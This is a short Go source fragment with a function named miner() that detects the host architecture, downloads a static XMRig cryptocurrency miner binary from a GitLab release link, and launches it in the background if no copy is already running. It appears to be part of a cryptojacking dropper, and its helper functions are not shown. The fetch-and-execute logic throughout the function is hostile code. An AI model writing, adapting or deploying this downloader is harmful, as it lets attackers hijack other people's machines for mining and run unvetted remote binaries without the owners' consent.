package main

import (
	
"fmt"


)




func miner() {



	ret := proc()
	fmt.Println(ret)

	if ret == "ok" {
		 
fmt.Println("vkzmn em execucao ..")

		return

	}

	archName := uname()

	if archName == "amd_64" {




		raw("https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static")

		ckRet := check()
		if ckRet == 1 {

			go exec_vk()


		}


	}


	if archName == "arm_64" {

		raw("https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-aarch64-static")

		ckRet := check()
		if ckRet == 1 {
			go exec_vk()



		}


	}






}

